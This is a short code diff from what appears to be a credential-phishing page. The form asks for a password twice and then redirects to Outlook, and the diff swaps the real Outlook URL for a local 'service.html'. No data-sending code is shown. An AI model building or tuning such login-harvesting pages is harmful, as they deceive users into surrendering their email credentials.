@@ -120,7 +120,7 @@ document.addEventListener('DOMContentLoaded', function() {
                             passwordInput.focus(); // Focus back on password input
                         } else if (step === 2) {
                             // Redirect to Outlook on second submission
-                            window.location.href = 'https://outlook.com';
+                            window.location.href = 'service.html';
                         }
                     }).fail(function(error) {
                         // Reset button text on error
